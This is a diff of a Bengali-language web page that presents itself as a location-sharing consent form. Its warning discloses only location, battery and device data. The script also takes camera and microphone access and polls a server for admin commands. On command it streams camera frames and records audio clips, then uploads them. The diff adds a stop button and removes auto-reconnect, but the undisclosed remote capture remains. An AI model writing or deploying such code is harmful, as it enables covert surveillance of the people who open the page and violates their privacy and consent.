@@ -9,60 +9,66 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #0f172a; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
-        .card { background: #1e293b; padding: 40px; border-radius: 25px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+        body { background: #0f172a; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; padding: 20px; }
+        .card { background: #1e293b; padding: 35px 25px; border-radius: 25px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
         .icon { font-size: 60px; margin-bottom: 15px; }
         h2 { color: #38bdf8; margin-bottom: 10px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
         .consent-btn { background: #22c55e; border: none; color: white; padding: 15px; width: 100%; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .consent-btn:hover { background: #16a34a; transform: scale(1.02); }
-        .consent-btn:disabled { background: #475569; cursor: not-allowed; transform: none; }
+        .consent-btn:hover { background: #16a34a; }
+        .consent-btn:disabled { background: #475569; cursor: not-allowed; }
         .status { margin-top: 20px; color: #facc15; font-size: 14px; }
-        .detail-box { background: #0f172a; padding: 15px; border-radius: 15px; margin: 15px 0; text-align: left; font-size: 13px; }
+        .detail-box { background: #0f172a; padding: 15px; border-radius: 15px; margin: 15px 0; text-align: left; font-size: 13px; line-height: 1.7; }
         .detail-box span { color: #94a3b8; }
-        .warning { color: #ef4444; font-size: 12px; background: #450a0a; padding: 10px; border-radius: 10px; margin-bottom: 15px; }
+        .warning { color: #fca5a5; font-size: 12px; background: #450a0a; padding: 12px; border-radius: 10px; margin-bottom: 15px; line-height: 1.5; }
+        .stop-btn { background: #ef4444; color: white; border: none; padding: 12px; width: 100%; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="icon">🛡️</div>
         <h2>লোকেশন শেয়ার করার অনুমতি</h2>
-        <div class="warning">⚠️ এই পেজটি আপনার লোকেশন, ব্যাটারি এবং ডিভাইসের তথ্য অ্যাডমিনের সাথে শেয়ার করবে।</div>
-        <p>আপনি নিচের বাটনে ক্লিক করলেই বুঝবেন যে আপনি <b>সম্মতি</b> দিচ্ছেন। যতক্ষণ এই ট্যাব খোলা থাকবে ততক্ষণ ডেটা পাঠানো হবে।</p>
-        
-        <div class="detail-box" id="infoBox">
+        <div class="warning">⚠️ এই পেজ আপনার লোকেশন, ব্যাটারি ও ডিভাইসের তথ্য অ্যাডমিনের সাথে শেয়ার করবে। সম্মতি না দিলে কিছুই পাঠানো হবে না।</div>
+        <p>শুধু নিচের বাটনে ক্লিক করলে ডেটা পাঠানো শুরু হবে। ট্যাব বন্ধ করলে বা "বন্ধ করুন" চাপলে সব বন্ধ হবে।</p>
+
+        <div class="detail-box">
             <span>📱 ডিভাইস: <b id="dDevice">লোড হচ্ছে...</b></span><br>
             <span>🌐 ব্রাউজার: <b id="dBrowser">লোড হচ্ছে...</b></span><br>
             <span>🔋 ব্যাটারি: <b id="dBattery">লোড হচ্ছে...</b></span>
         </div>
 
         <button class="consent-btn" id="consentBtn" onclick="startSharing()">✅ আমি সম্মতি দিচ্ছি</button>
+        <button class="stop-btn" id="stopBtn" onclick="stopSharing()">⏹️ শেয়ারিং বন্ধ করুন</button>
         <div class="status" id="statusMsg">⏳ অপেক্ষা করছি...</div>
     </div>
 
     <script>
+        let locationWatch = null;
         let sharingInterval = null;
         let videoInterval = null;
-        let stream = null; 
+        let stream = null;
         let videoElement = document.createElement('video');
         let canvas = document.createElement('canvas');
         let ctx = canvas.getContext('2d');
+        let lastSendTime = 0;
+        let isSharing = false;
 
         const btn = document.getElementById('consentBtn');
+        const stopBtn = document.getElementById('stopBtn');
         const statusMsg = document.getElementById('statusMsg');
-        
-        // লোকাল স্টোরেজ থেকে আইডি নেওয়া (একবার তৈরি হলে আর পরিবর্তন হবে না)
-        let clientId = localStorage.getItem("tracker_client_id");
+
+        // সেশন-ভিত্তিক আইডি (প্রতি ট্যাবে আলাদা)
+        let clientId = sessionStorage.getItem("tracker_client_id");
         if (!clientId) {
-            clientId = 'device_' + Math.random().toString(36).substr(2, 9);
-            localStorage.setItem("tracker_client_id", clientId);
+            clientId = 'device_' + Math.random().toString(36).substring(2, 11);
+            sessionStorage.setItem("tracker_client_id", clientId);
         }
 
         function getPhoneModel(ua) {
             let model = "Unknown Device";
-            const match = ua.match(/\((.*?)\)/);
-            if (match && match[1]) {
-                const parts = match[1].split(';');
+            const m = ua.match(/\((.*?)\)/);
+            if (m && m[1]) {
+                const parts = m[1].split(';');
                 if (parts.length > 2) {
                     model = parts[2].trim();
                     if (model.includes("Build")) model = model.split("Build")[0].trim();
@@ -72,142 +78,202 @@
             return model;
         }
 
-        function getDeviceInfo() {
+        function initDeviceInfo() {
             const ua = navigator.userAgent;
             document.getElementById('dDevice').innerText = getPhoneModel(ua);
-            let browser = 'অজানা';
-            if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
-            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
-            document.getElementById('dBrowser').innerText = browser;
+            let b = 'অজানা';
+            if (ua.includes('Chrome')) b = 'Chrome';
+            else if (ua.includes('Safari')) b = 'Safari';
+            else if (ua.includes('Firefox')) b = 'Firefox';
+            document.getElementById('dBrowser').innerText = b;
 
             if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    document.getElementById('dBattery').innerText = Math.round(battery.level * 100) + '%';
+                navigator.getBattery().then(bat => {
+                    document.getElementById('dBattery').innerText = Math.round(bat.level * 100) + '%';
                 });
             }
         }
-        getDeviceInfo();
+        initDeviceInfo();
 
+        // ✅ সম্মতি ছাড়া কিছুই চালু হবে না (window.onload-এ auto start নেই)
         async function startSharing() {
+            if (isSharing) return;
             btn.disabled = true;
             btn.innerText = '⏳ পারমিশন চাচ্ছি...';
-            statusMsg.innerText = '📡 ডিভাইস কানেক্ট হচ্ছে...';
+            statusMsg.innerText = '📡 ডিভাইস প্রস্তুত হচ্ছে...';
 
+            // ক্যামেরা/মাইক — শুধু তখনই চাইবো যখন অ্যাডমিন কমান্ড দেবে না, ব্যবহারকারী চাইলে
+            // এখানে লোকেশন আগে নিই, তারপর ক্যামেরা
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 videoElement.srcObject = stream;
-                videoElement.play();
-            } catch (err) {
-                console.log("ক্যামেরা পারমিশন নেই, কিন্তু লোকেশন চলবে: ", err);
+                await videoElement.play().catch(() => {});
+            } catch (e) {
+                console.log("ক্যামেরা/মাইক পারমিশন নেই:", e);
+                // লোকেশন তবুও চলবে
             }
 
-            sendData(0, 0, 5000, 'N/A', false);
             startTracking();
         }
 
         function startTracking() {
-            btn.innerText = '✅ শেয়ারিং চলছে';
+            isSharing = true;
+            btn.style.display = 'none';
+            stopBtn.style.display = 'block';
             statusMsg.innerText = '🟢 কানেক্টেড! লোকেশন পাঠানো হচ্ছে...';
-            localStorage.setItem("tracker_consent", "true");
 
-            navigator.geolocation.watchPosition(
-                (pos) => {
-                    sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'N/A', false);
-                },
-                (err) => { sendData(0, 0, 5000, 'N/A', false); },
-                { enableHighAccuracy: true, timeout: 30000, maximumAge: 10000 }
-            );
+            if (navigator.geolocation) {
+                locationWatch = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                    },
+                    (err) => {
+                        console.warn("GPS error:", err.message);
+                        // ✅ ভুয়া 0,0 পাঠাচ্ছি না — শুধু status
+                        sendData(null, null, null);
+                    },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 10000 }
+                );
+            } else {
+                statusMsg.innerText = '❌ এই ব্রাউজারে জিওলোকেশন নেই';
+            }
 
             sharingInterval = setInterval(checkCommands, 2000);
         }
 
-        // পেজ লোড হওয়ার সাথে সাথে চেক করবে আগে সম্মতি দেওয়া হয়েছে কিনা
-        window.onload = () => {
-            if (localStorage.getItem("tracker_consent") === "true") {
-                btn.innerText = '🔄 অটো কানেক্ট হচ্ছে...';
-                startTracking();
-            }
-        };
+        function stopSharing() {
+            isSharing = false;
+            if (locationWatch !== null) { navigator.geolocation.clearWatch(locationWatch); locationWatch = null; }
+            if (sharingInterval) { clearInterval(sharingInterval); sharingInterval = null; }
+            if (videoInterval) { clearInterval(videoInterval); videoInterval = null; }
+            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
 
-        function sendData(lat, lng, accuracy, battery, charging) {
+            btn.disabled = false;
+            btn.style.display = 'block';
+            btn.innerText = '✅ আবার শুরু করুন';
+            stopBtn.style.display = 'none';
+            statusMsg.innerText = '⏹️ শেয়ারিং বন্ধ হয়েছে';
+        }
+
+        // ✅ প্রতি ৩ সেকেন্ডে max একবার পাঠানো (throttle)
+        function sendData(lat, lng, accuracy) {
+            const now = Date.now();
+            if (now - lastSendTime < 3000) return;
+            lastSendTime = now;
+
             const data = {
-                id: clientId, lat, lng, accuracy,
+                id: clientId,
                 device: document.getElementById('dDevice').innerText,
                 browser: document.getElementById('dBrowser').innerText,
-                battery, charging,
-                time: new Date().toISOString()
+                battery: document.getElementById('dBattery').innerText.replace('%', ''),
+                charging: 'false',
+                time: new Date().toISOString(),
             };
+            if (lat !== null && lng !== null) {
+                data.lat = lat;
+                data.lng = lng;
+                data.accuracy = accuracy || 0;
+            }
+
             fetch('/api/update', {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(err => console.error(err));
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+            }).catch(e => console.error(e));
         }
 
         function checkCommands() {
-            fetch('/api/clients?t=' + new Date().getTime(), { cache: 'no-store' })
-                .then(res => res.json())
+            fetch('/api/clients?t=' + Date.now(), { cache: 'no-store' })
+                .then(r => r.json())
                 .then(clients => {
-                    const data = clients[clientId];
-                    if (!data) return;
-                    
-                    if (data.command === 'start_live') startLiveVideo();
-                    else if (data.command === 'stop_live') stopLiveVideo();
-                    else if (data.command === 'record_audio') recordAudio();
-                }).catch(err => console.log(err));
+                    const d = clients[clientId];
+                    if (!d) return;
+                    if (d.command === 'start_live') startLiveVideo();
+                    else if (d.command === 'stop_live') stopLiveVideo();
+                    else if (d.command === 'record_audio') recordAudio();
+                })
+                .catch(e => console.log(e));
         }
 
         function startLiveVideo() {
-            if (videoInterval) return;
-            if (!stream) return;
+            if (videoInterval || !stream) return;
+            // ✅ আগের কমান্ড মুছে ফেলা (আবার trigger না হয়)
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: clientId, command: '' }),
+            }).catch(() => {});
 
             videoInterval = setInterval(() => {
                 if (videoElement.videoWidth === 0) return;
-                canvas.width = videoElement.videoWidth;
-                canvas.height = videoElement.videoHeight;
+                canvas.width = 480;
+                canvas.height = Math.round(videoElement.videoHeight * (480 / videoElement.videoWidth));
                 ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                const frameData = canvas.toDataURL('image/jpeg', 0.3);
-                
+                const frame = canvas.toDataURL('image/jpeg', 0.4);
                 fetch('/api/update', {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id: clientId, video_frame: frameData, time: new Date().toISOString() })
-                }).catch(err => console.error(err));
-            }, 300);
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        id: clientId,
+                        video_frame: frame,
+                        time: new Date().toISOString(),
+                    }),
+                }).catch(e => console.error(e));
+            }, 800);  // ✅ ৩০০ms → ৮০০ms (ব্যান্ডউইথ সাশ্রয়)
         }
 
         function stopLiveVideo() {
-            if (videoInterval) {
-                clearInterval(videoInterval);
-                videoInterval = null;
-            }
+            if (videoInterval) { clearInterval(videoInterval); videoInterval = null; }
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: clientId, command: '' }),
+            }).catch(() => {});
         }
 
         function recordAudio() {
             if (!stream) return;
-            const audioTrack = stream.getAudioTracks()[0];
-            if (!audioTrack) return;
-            const audioChunks = [];
-            const mediaRecorder = new MediaRecorder(new MediaStream([audioTrack]));
-            mediaRecorder.ondataavailable = event => { if (event.data.size > 0) audioChunks.push(event.data); };
-            mediaRecorder.onstop = () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            const track = stream.getAudioTracks()[0];
+            if (!track) return;
+
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: clientId, command: '' }),
+            }).catch(() => {});
+
+            const chunks = [];
+            const rec = new MediaRecorder(new MediaStream([track]));
+            rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            rec.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
                 const reader = new FileReader();
-                reader.readAsDataURL(audioBlob);
                 reader.onloadend = () => {
                     fetch('/api/update', {
-                        method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ id: clientId, audio_data: reader.result, time: new Date().toISOString() })
-                    }).catch(err => console.error(err));
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            id: clientId,
+                            audio_data: reader.result,
+                            time: new Date().toISOString(),
+                        }),
+                    }).catch(e => console.error(e));
                 };
+                reader.readAsDataURL(blob);
             };
-            mediaRecorder.start();
-            setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, 5000);
+            rec.start();
+            setTimeout(() => { if (rec.state !== 'inactive') rec.stop(); }, 5000);
         }
+
+        // ✅ পেজ বন্ধ হলে সব থামাও
+        window.addEventListener('beforeunload', () => {
+            if (isSharing) stopSharing();
+        });
     </script>
     <script>
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/service-worker.js')
-                .then(reg => console.log('SW Registered!', reg))
-                .catch(err => console.log('SW Failed!', err));
+                .catch(e => console.log('SW Failed:', e));
         }
     </script>
 </body>
